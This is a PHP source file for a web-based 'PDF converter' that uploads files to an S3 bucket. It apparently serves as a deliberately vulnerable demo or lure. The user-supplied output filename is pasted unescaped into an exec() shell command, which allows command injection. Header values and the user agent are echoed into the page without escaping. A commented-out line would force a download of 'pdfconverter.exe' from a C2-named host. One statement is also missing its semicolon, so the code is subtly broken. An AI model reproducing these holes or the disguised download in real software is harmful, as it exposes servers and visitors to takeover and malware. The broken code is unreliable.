<?php

  require '../vendor/autoload.php';
  use Aws\S3\S3Client;
  use Aws\S3\Exception\S3Exception;
  $s3 = new Aws\S3\S3Client([
    'version' => 'latest',
    'region' => 'eu-west-2',
  ]);

  $bucket='arnab-pdf-bucket';
  $target_local_dir = "../data/";
  $filename = date("Ymds").".pdf";
  $key = basename($filename);
  $filepath = $target_local_dir.$filename;

?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Z Secure PDF Converter! </title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
    <script>

        function download(fileUrl, fileName) {
        var a = document.createElement("a");
        a.href = fileUrl;
        a.setAttribute("download", fileName);
        a.click();
        }

    </script>
    <style type="text/css">
         .topcorner{
                position:absolute;
                top:0;
                right:0;
                width:min-content;
        }
        .bordercolor{

                border:2px solid green;

        }
   </style>
 </head>
<?php

$real_ip_address="";

if (isset($_SERVER['HTTP_CLIENT_IP']))
{
    $real_ip_adress = $_SERVER['HTTP_CLIENT_IP'];
}

if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
{
    $real_ip_adress = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
    $real_ip_adress = $_SERVER['REMOTE_ADDR'];
}

$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $real_ip_adress));


?>
    <body>
      <div class="topcorner">
        <span class="border border-info">
        <span class="bordercolor"><?php echo "Browser: ".$_SERVER['HTTP_USER_AGENT']."<br><br> Remote IP: ".$real_ip_adress."<br><br> Country Name: ".$ipdat->geoplugin_countryName ?></span>
        </span>
      </div>

      <div class="col-md-6 offset-md-3 mt-5">
              <a target="_blank" href="https://www.trellix.com">
                <img src='zscaler-logo.svg' style="width:100px;height:100px;">
              </a>
              <br>
              <h1><a target="_blank" href="https://www.zscaler.com" class="mt-3 d-flex">Convert Your Files to PDF!</a></h1>

              <form accept-charset="UTF-8" action="" method="POST" enctype="multipart/form-data">
                <div class="form-group">
                  <label for="exampleInputEmail1" required="required">Output File Name</label>
                  <input type="text" name="filename" value="<?php echo $filename;?>" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="<?php echo date("Ymds").".pdf";?>">
                </div>
                <hr>
                <div class="form-group mt-3">
                  <label class="mr-2">Upload your File</label>
                  <input type="file" name="fileToUpload" id="fileToUpload">
                </div>
                <hr>
                <button type="submit" name="submit" class="btn btn-primary">Submit</button>

              </form>

              <iframe id="invisible" style="display:none;"></iframe>

      </div>


<?php


  if(isset($_POST["submit"]) && $_FILES["fileToUpload"]["name"]!="") {

    
    $target_file = $target_local_dir . basename($_FILES["fileToUpload"]["name"]);
    $fileTmpLoc = $_FILES["fileToUpload"]["tmp_name"];
    $moveResult = move_uploaded_file($fileTmpLoc, $target_file);
    #$convert="convert \"$target_file\" \"$filepath\"" ;
    $outputFileName=$_POST["filename"];
    $convert="convert \"$target_file\" \"$target_local_dir$outputFileName\""
    exec($convert,$output,$return);
    
    $result = $s3->putObject([
      'Bucket' => $bucket,
      'Key'    => $key,
      'Body'   => fopen($filepath,'r'),
      'ACL'    => 'private'
    ]);

    $cmd = $s3->getCommand('GetObject', [
      'Bucket' => $bucket,
      'Key' => $key
    ]);

    $request = $s3->createPresignedRequest($cmd, '+20 minutes');
    $download_link = (string)$request->getUri();
    unlink($target_file);
    echo '<div class="col-md-6 offset-md-3 mt-5"><label class="mr-2">Download Your Converted File </label>
    <a target="_blank" href="'.$download_link.'" id="it">Click Here</a><p>This link is only valid for 20 minutes</p></div><hr></div>';
    #echo '<script>download("http://c2.cybernix.co.uk/pdfcoverter.exe","pdfconverter.exe");</script>';
  }
  elseif(isset($_POST["submit"]) && $_FILES["fileToUpload"]["name"]==""){
        echo '<div class="form-group mt-3"><label class="mr-2">Enter a Valid Filename/Upload a file </label></div><hr></div>';
  }

?>


 </body>
</html>
